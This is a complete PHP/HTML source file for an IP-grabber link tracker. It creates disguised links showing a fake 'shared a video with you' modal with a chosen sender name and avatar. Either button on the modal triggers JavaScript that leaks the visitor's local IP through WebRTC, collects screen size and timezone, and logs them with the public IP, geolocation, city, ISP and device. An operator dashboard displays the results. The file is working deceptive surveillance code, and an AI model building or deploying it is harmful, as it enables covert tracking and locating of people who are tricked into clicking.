<?php
date_default_timezone_set('Africa/Algiers');

ini_set('display_errors', 1);
error_reporting(E_ALL);

try {
    $db = new PDO('sqlite:tracker_modal.db');$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);

    $db->exec("CREATE TABLE IF NOT EXISTS links (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT UNIQUE, 
        target_url TEXT, 
        sender_name TEXT,
        sender_avatar TEXT,
        meta_title TEXT,
        meta_image TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");

    $db->exec("CREATE TABLE IF NOT EXISTS logs (
        id INTEGER PRIMARY KEY AUTOINCREMENT, 
        code TEXT, 
        public_ip TEXT, 
        local_ip TEXT, 
        port TEXT, 
        country TEXT, 
        city TEXT, 
        lat TEXT, 
        lon TEXT, 
        isp TEXT, 
        device_info TEXT, 
        screen_res TEXT, 
        timezone TEXT, 
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP
    )");
} catch (Exception $e) {
    die("Database error: " . $e->getMessage());
}

function fetch_real_meta($url) {$title = "Shared Media";
    $image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL,$url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3);
    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)');
    $html = curl_exec($ch);
    curl_close($ch);

    if ($html) {$dom = new DOMDocument();
        @$dom->loadHTML(mb_convert_encoding($html, 'HTML-ENTITIES', 'UTF-8'));
        $xpath = new DOMXPath($dom);

        $titleNodes =$xpath->query('//meta[@property="og:title"]/@content | //meta[@name="twitter:title"]/@content');
        if ($titleNodes->length > 0) {
            $title =$titleNodes->item(0)->nodeValue;
        }

        $imageNodes =$xpath->query('//meta[@property="og:image"]/@content | //meta[@name="twitter:image"]/@content');
        if ($imageNodes->length > 0) {
            $image =$imageNodes->item(0)->nodeValue;
        }
    }
    return ['title' => trim($title), 'image' => trim($image)];
}

function get_real_ip() {
    if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',',$_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

function parse_isp($isp_name, $org_name) {$combined = $isp_name . ' ' .$org_name;
    if (stripos($combined, 'Mobilis') !== false or stripos($combined, 'ATM') !== false) return 'Mobilis';
    if (stripos($combined, 'Djezzy') !== false or stripos($combined, 'Optimum Telecom') !== false) return 'Djezzy';
    if (stripos($combined, 'Ooredoo') !== false or stripos($combined, 'Wataniya') !== false) return 'Ooredoo';
    if (stripos($combined, 'Algérie Télécom') !== false or stripos($combined, 'Algerie Telecom') !== false or stripos($combined, 'AT') !== false) return 'Algérie Télécom';
    return trim($isp_name) ?: 'Unknown';
}

function get_device_type($ua) {$brand = 'Device';
    if (stripos($ua, 'Samsung') !== false)$brand = 'Samsung';
    elseif (stripos($ua, 'iPhone') !== false)$brand = 'iPhone';
    elseif (stripos($ua, 'Huawei') !== false)$brand = 'Huawei';
    elseif (stripos($ua, 'Xiaomi') !== false or stripos($ua, 'Redmi') !== false)$brand = 'Xiaomi';
    elseif (stripos($ua, 'Oppo') !== false)$brand = 'Oppo';

    if (stripos($ua, 'Android') !== false) return$brand . ' - Android';
    if (stripos($ua, 'iPhone') !== false or stripos($ua, 'iPad') !== false) return$brand . ' - iOS';
    if (stripos($ua, 'Windows') !== false) return 'PC - Windows';
    if (stripos($ua, 'Macintosh') !== false) return 'PC - Mac';
    return 'Unknown Device';
}

function get_ip_details($ip) {
    if ($ip == '127.0.0.1' or $ip == '::1' or$ip == 'Unknown' or strpos($ip, '10.') === 0 or strpos($ip, '192.168.') === 0) {
        return ['country' => 'Algeria (Local)', 'city' => 'Local Network', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Localhost'];
    }
    $json = @file_get_contents("http://ip-api.com/json/" . $ip . "?fields=status,country,city,lat,lon,isp,org");
    $data = json_decode($json, true);
    if ($data and isset($data['status']) and$data['status'] == 'success') {
        return [
            'country' => $data['country'] ?? 'Unknown',
            'city' => $data['city'] ?? 'Unknown',
            'lat' => $data['lat'] ?? '36.7538', 'lon' =>$data['lon'] ?? '3.0588',
            'isp' => parse_isp($data['isp'] ?? '',$data['org'] ?? '')
        ];
    }
    return ['country' => 'Unknown', 'city' => 'Unknown', 'lat' => '36.7538', 'lon' => '3.0588', 'isp' => 'Unknown'];
}

$og_title = "Shared Video";
$og_image = "https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600&auto=format&fit=crop&q=60";
$target_redirect = "";
$sender_name = "User";
$sender_avatar = "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";

if (isset($_GET['r'])) {
    $code =$_GET['r'];
    $stmt =$db->prepare("SELECT * FROM links WHERE code = ?");
    $stmt->execute([$code]);
    $link =$stmt->fetch(PDO::FETCH_ASSOC);

    if ($link) {
        $target_redirect =$link['target_url'];
        $og_title =$link['meta_title'];
        $og_image =$link['meta_image'];
        $sender_name =$link['sender_name'];
        $sender_avatar =$link['sender_avatar'];

        if (isset($_GET['save_log']) &&$_GET['save_log'] == '1') {
            $public_ip = get_real_ip();$local_ip = $_GET['lip'] ?? $public_ip;
            $port = $_SERVER['REMOTE_PORT'] ?? 'N/A';$geo = get_ip_details($public_ip);$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';$device = get_device_type($ua);$screen = $_GET['screen'] ?? 'N/A';$tz = $_GET['tz'] ?? 'N/A';$created_at = date('Y-m-d H:i:s');

            try {
                $logStmt =$db->prepare("INSERT INTO logs (code, public_ip, local_ip, port, country, city, lat, lon, isp, device_info, screen_res, timezone, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)");
                $logStmt->execute([$code, $public_ip,$local_ip, $port,$geo['country'], $geo['city'],$geo['lat'], $geo['lon'],$geo['isp'], $device,$screen, $tz,$created_at]);
            } catch (Exception $e) {}
            exit('OK');
        }
    } else {
        die("Link not found.");
    }
}

$generated_link = "";
$tracking_code = "";
if ($_SERVER['REQUEST_METHOD'] === 'POST' and isset($_POST['create'])) {
    $target_url = trim($_POST['target_url']);
    $sender_name = trim($_POST['sender_name']) ?: "User";
    $sender_avatar = trim($_POST['sender_avatar']) ?: "https://images.unsplash.com/photo-1535713875002-d1d0cf377fde?w=100&auto=format&fit=crop&q=60";

    if (!filter_var($target_url, FILTER_VALIDATE_URL)) {
        $target_url = "https://" . $target_url;
    }

    $meta = fetch_real_meta($target_url);$code = substr(md5(uniqid(rand(), true)), 0, 7);

    $stmt =$db->prepare("INSERT INTO links (code, target_url, sender_name, sender_avatar, meta_title, meta_image) VALUES (?, ?, ?, ?, ?, ?)");
    $stmt->execute([$code,$target_url, $sender_name,$sender_avatar, $meta['title'],$meta['image']]);

    $tracking_code =$code;
    $domain = $_SERVER['HTTP_HOST'];$generated_link = "https://" . $domain . "/?r=" . $code;
}

$filter_code = trim($_GET['track'] ?? '');
if (!empty($filter_code)) {
    $stmt =$db->prepare("SELECT * FROM logs WHERE code = ? ORDER BY id DESC");
    $stmt->execute([$filter_code]);
    $logs =$stmt->fetchAll(PDO::FETCH_ASSOC);
} else {
    $logs =$db->query("SELECT * FROM logs ORDER BY id DESC LIMIT 50")->fetchAll(PDO::FETCH_ASSOC);
}

if (isset($_GET['r']) && !empty($target_redirect)):
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo htmlspecialchars($og_title); ?></title>
    <meta property="og:title" content="<?php echo htmlspecialchars($og_title); ?>">
    <meta property="og:image" content="<?php echo htmlspecialchars($og_image); ?>">
    <meta property="og:type" content="website">
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: #000; height: 100vh; overflow: hidden; display: flex; justify-content: center; align-items: center; position: relative; }
        .bg-blur { position: absolute; width: 100%; height: 100%; background: url('<?php echo htmlspecialchars($og_image); ?>') no-repeat center center/cover; filter: blur(20px); opacity: 0.4; }
        
        .modal-card { position: relative; background: #ffffff; width: 90%; max-width: 360px; border-radius: 24px; padding: 30px 20px; text-align: center; box-shadow: 0 25px 50px rgba(0,0,0,0.5); z-index: 10; animation: popUp 0.3s ease-out; }
        @keyframes popUp { 0% { transform: scale(0.8); opacity: 0; } 100% { transform: scale(1); opacity: 1; } }

        .avatar-container { width: 84px; height: 84px; border-radius: 50%; overflow: hidden; margin: -65px auto 16px auto; border: 4px solid #fff; box-shadow: 0 4px 12px rgba(0,0,0,0.15); background: #eee; }
        .avatar-container img { width: 100%; height: 100%; object-fit: cover; }

        h2 { font-size: 20px; font-weight: 700; color: #111; margin-bottom: 8px; }
        p { font-size: 13px; color: #666; margin-bottom: 24px; line-height: 1.5; }

        .btn-action { display: block; width: 100%; background: #fe2c55; color: white; border: none; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 15px; cursor: pointer; text-decoration: none; margin-bottom: 12px; box-shadow: 0 4px 14px rgba(254,44,85,0.4); }
        .btn-action:active { transform: scale(0.98); }
        .btn-secondary { background: transparent; color: #888; border: none; font-size: 14px; font-weight: 500; cursor: pointer; padding: 6px; }
    </style>
    <script>
        function getLocalIP(callback) {
            let foundLocal = false;
            let RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;
            if (!RTCPeerConnection) {
                fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => callback(data.ip)).catch(() => callback("Unknown"));
                return;
            }
            let pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(offer => pc.setLocalDescription(offer)).catch(() => {});
            pc.onicecandidate = function(ice) {
                if (!ice || !ice.candidate || !ice.candidate.candidate) return;
                let myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(ice.candidate.candidate);
                if (myIP) {
                    let ip = myIP[1];
                    if (ip.startsWith("192.168.") || ip.startsWith("10.") || ip.startsWith("172.")) {
                        if (!foundLocal) {
                            foundLocal = true;
                            callback(ip);
                            pc.onicecandidate = null;
                        }
                    }
                }
            };
            setTimeout(() => {
                if (!foundLocal) {
                    fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => callback(data.ip)).catch(() => callback("Direct"));
                }
            }, 80);
        }

        function executeTrackingAndRedirect() {
            const redirectCode = "<?php echo htmlspecialchars($_GET['r']); ?>";
            const targetUrl = "<?php echo $target_redirect; ?>";

            getLocalIP(function(localIp) {
                const screenRes = screen.width + "x" + screen.height;
                const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
                const logUrl = `/?r=${redirectCode}&save_log=1&lip=${encodeURIComponent(localIp)}&screen=${encodeURIComponent(screenRes)}&tz=${encodeURIComponent(tz)}`;
                
                if (navigator.sendBeacon) {
                    navigator.sendBeacon(logUrl);
                } else {
                    fetch(logUrl, { method: 'GET', keepalive: true });
                }

                setTimeout(function() {
                    window.location.replace(targetUrl);
                }, 120);
            });
        }
    </script>
</head>
<body>
    <div class="bg-blur"></div>
    <div class="modal-card">
        <div class="avatar-container">
            <img src="<?php echo htmlspecialchars($sender_avatar); ?>" alt="Avatar">
        </div>
        <h2>Watch this video</h2>
        <p><strong><?php echo htmlspecialchars($sender_name); ?></strong> shared a video with you. Watch now to view content!</p>
        <button class="btn-action" onclick="executeTrackingAndRedirect()">Watch Now</button>
        <button class="btn-secondary" onclick="executeTrackingAndRedirect()">Not now</button>
    </div>
</body>
</html>
<?php 
    exit(); 
endif; 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dynamic Modal Control Panel</title>
    <style>
        :root {
            --bg-main: #0b0f17;
            --bg-card: #131b2e;
            --border-color: #1e293b;
            --text-main: #e2e8f0;
            --text-muted: #64748b;
            --accent: #6366f1;
            --accent-hover: #4f46e5;
            --danger: #ef4444;
        }
        * { box-sizing: border-box; margin: 0; padding: 0; font-family: system-ui, -apple-system, sans-serif; }
        body { background-color: var(--bg-main); color: var(--text-main); padding: 30px 15px; min-height: 100vh; display: flex; flex-direction: column; justify-content: space-between; }
        .wrapper { max-width: 1200px; width: 100%; margin: 0 auto; display: grid; gap: 24px; }
        
        .section-box { background: var(--bg-card); border: 1px solid var(--border-color); border-radius: 12px; padding: 25px; box-shadow: 0 10px 15px rgba(0,0,0,0.3); }
        h2 { font-size: 14px; font-weight: 600; text-transform: uppercase; letter-spacing: 0.1em; color: var(--text-muted); margin-bottom: 16px; border-bottom: 1px solid var(--border-color); padding-bottom: 8px; }

        .form-grid { display: grid; gap: 12px; }
        input[type="text"] { width: 100%; background: #020617; border: 1px solid var(--border-color); border-radius: 8px; padding: 12px 14px; color: var(--text-main); font-size: 14px; outline: none; }
        input[type="text"]:focus { border-color: var(--accent); }
        
        .btn { background: var(--accent); color: white; border: none; padding: 0 24px; border-radius: 8px; font-weight: 600; cursor: pointer; height: 46px; display: inline-flex; align-items: center; justify-content: center; font-size: 14px; text-decoration: none; transition: background 0.2s; }
        .btn:hover { background: var(--accent-hover); }
        .btn-danger { background: var(--danger); }
        .btn-secondary { background: #334155; }

        .result-panel { background: #020617; border: 1px solid var(--border-color); padding: 16px; border-radius: 8px; margin-top: 15px; }
        .result-panel label { display: block; font-size: 10px; text-transform: uppercase; color: var(--text-muted); margin-bottom: 6px; }
        .flex-row { display: flex; gap: 8px; }

        .table-wrap { overflow-x: auto; border: 1px solid var(--border-color); border-radius: 8px; margin-top: 15px; }
        table { width: 100%; border-collapse: collapse; text-align: left; font-size: 12px; min-width: 900px; }
        th { background: #020617; color: var(--text-muted); padding: 12px 15px; border-bottom: 1px solid var(--border-color); text-transform: uppercase; }
        td { padding: 12px 15px; border-bottom: 1px solid var(--border-color); color: #cbd5e1; white-space: nowrap; }
        tr:hover { background: rgba(30, 41, 59, 0.4); }

        .code-badge { background: rgba(99, 102, 241, 0.1); color: #818cf8; padding: 4px 8px; border-radius: 4px; font-family: monospace; border: 1px solid rgba(99, 102, 241, 0.2); }
        footer { text-align: center; margin-top: 40px; font-size: 11px; color: var(--text-muted); border-top: 1px solid var(--border-color); padding-top: 20px; }
        footer span { color: var(--accent); font-weight: 600; }
    </style>
    <script>
        function copyText(text, btnElement) {
            navigator.clipboard.writeText(text).then(() => {
                const original = btnElement.innerText;
                btnElement.innerText = "Copied";
                btnElement.style.background = "#10b981";
                setTimeout(() => {
                    btnElement.innerText = original;
                    btnElement.style.background = "";
                }, 2000);
            });
        }
    </script>
</head>
<body>
    <div class="wrapper">
        
        <div class="section-box">
            <h2>Generate Dynamic Modal Link</h2>
            <form method="POST" class="form-grid">
                <input type="text" name="target_url" placeholder="Target Destination URL (e.g. YouTube)..." required>
                <div style="display: flex; gap: 10px;">
                    <input type="text" name="sender_name" placeholder="Sender Name (e.g. azez)">
                    <input type="text" name="sender_avatar" placeholder="Sender Avatar Image URL">
                </div>
                <button type="submit" name="create" class="btn">Generate Tracking Link</button>
            </form>

            <?php if (!empty($generated_link)): ?>
                <div class="result-panel">
                    <label>Active Dynamic Link:</label>
                    <div class="flex-row">
                        <input type="text" readonly value="<?php echo htmlspecialchars($generated_link); ?>">
                        <button type="button" class="btn btn-secondary" onclick="copyText('<?php echo htmlspecialchars($generated_link); ?>', this)">Copy</button>
                    </div>
                </div>
            <?php endif; ?>
        </div>

        <div class="section-box">
            <h2>Live Visit Logs & Analytics</h2>
            <div class="table-wrap">
                <table>
                    <thead>
                        <tr>
                            <th>#ID</th>
                            <th>Code</th>
                            <th>Public IP</th>
                            <th>Local IP</th>
                            <th>Device</th>
                            <th>Geolocation</th>
                            <th>ISP</th>
                            <th>Timestamp</th>
                        </tr>
                    </thead>
                    <tbody>
                        <?php if (empty($logs)): ?>
                            <tr><td colspan="8" style="text-align: center; color: var(--text-muted); padding: 30px;">No logs found.</td></tr>
                        <?php else: ?>
                            <?php foreach ($logs as$log): ?>
                            <tr>
                                <td><?php echo $log['id']; ?></td>
                                <td><span class="code-badge"><?php echo htmlspecialchars($log['code']); ?></span></td>
                                <td style="font-family:monospace; color:#38bdf8;"><?php echo htmlspecialchars($log['public_ip']); ?></td>
                                <td style="font-family:monospace; color:#34d399;"><?php echo htmlspecialchars($log['local_ip']); ?></td>
                                <td><?php echo htmlspecialchars($log['device_info']); ?></td>
                                <td><?php echo htmlspecialchars($log['country']); ?> / <?php echo htmlspecialchars($log['city']); ?></td>
                                <td style="color: #38bdf8;"><?php echo htmlspecialchars($log['isp']); ?></td>
                                <td style="color: #10b981;"><?php echo htmlspecialchars($log['created_at']); ?></td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>

    </div>

    <footer>
        <p>Core Engine <span>azeez</span> &copy; 2026</p>
    </footer>
</body>
</html>
